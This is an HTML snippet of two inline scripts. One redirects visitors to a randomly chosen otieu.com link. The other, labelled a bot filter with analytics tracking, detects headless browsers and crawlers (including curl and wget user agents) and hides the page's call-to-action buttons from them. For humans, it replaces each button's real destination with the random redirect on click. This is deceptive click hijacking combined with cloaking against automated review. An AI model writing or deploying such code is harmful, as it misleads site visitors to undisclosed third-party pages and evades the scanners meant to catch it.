<!-- Random redirect with sessionStorage limit -->
<script>
  const links = [
    "https://otieu.com/4/9647786",
    "https://otieu.com/4/9647792",
    "https://otieu.com/4/9647790",
    "https://otieu.com/4/9647793",
    "https://otieu.com/4/9647808"
  ];
  function getLink(){
    if(sessionStorage.getItem("clicked")) return;
    sessionStorage.setItem("clicked",1);
    const i = Math.floor(Math.random() * links.length);
    window.location.href = links[i];
  }
</script>

<!-- Bot Filter + GA tracking -->
<script>
(function(){
  const DELAY_MS = 2000, MIN_ACTIVITY = 1;
  const ctas = Array.from(document.querySelectorAll('.btn, .cta'));
  if (!ctas.length) return;

  let isBot=false, activityCount=0;
  try {
    if(navigator.webdriver) isBot=true;
    const ua=navigator.userAgent||'';
    if(/(HeadlessChrome|PhantomJS|puppeteer|bot|crawler|spider|curl|wget)/i.test(ua)) isBot=true;
  } catch(e){}

  const markActive=()=>{activityCount=Math.min(999,activityCount+1);};
  ['mousemove','scroll','touchstart','keydown'].forEach(ev=>window.addEventListener(ev,markActive,{passive:true}));

  ctas.forEach(btn=>{
    btn.dataset._origHref=btn.getAttribute('href')||'#';
    btn.setAttribute('href','#');
    btn.dataset._disabled='1';
    btn.style.pointerEvents='none';
    btn.style.opacity='.6';
  });

  setTimeout(()=>{
    const engaged=activityCount>=MIN_ACTIVITY;
    if(window.gtag) gtag('event','page_view',{bot_suspected:isBot?1:0, engaged:engaged?1:0});
    if(!isBot && engaged){
      ctas.forEach(btn=>{
        delete btn.dataset._disabled;
        btn.style.pointerEvents='';
        btn.style.opacity='';
      });
    } else {
      ctas.forEach(btn=>btn.style.display='none');
    }
  }, DELAY_MS);

  ctas.forEach(btn=>{
    btn.addEventListener('click', function(ev){
      ev.preventDefault();
      if(btn.dataset._disabled==='1') return;
      const label=btn.textContent.trim().slice(0,60);
      if(window.gtag) gtag('event','cta_click',{event_category:'engagement',event_label:label,value:1});
      setTimeout(()=>{ if(typeof window.getLink==='function') getLink(); },120);
    }, {passive:false});
  });
})();
</script>
